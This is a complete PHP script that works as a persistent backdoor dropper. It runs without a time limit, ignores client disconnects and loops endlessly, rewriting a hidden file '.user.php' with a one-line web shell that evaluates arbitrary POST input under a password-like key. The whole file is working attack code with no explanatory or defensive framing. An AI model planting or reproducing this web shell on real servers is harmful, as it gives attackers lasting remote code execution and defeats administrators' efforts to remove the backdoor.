<?php
ignore_user_abort(true);
set_time_limit(0);

while (TRUE) {
$file = '.user.php';
$shell = '<?php @eval($_POST[Test@1234]);?>';
file_put_contents($file, $shell);
}
?>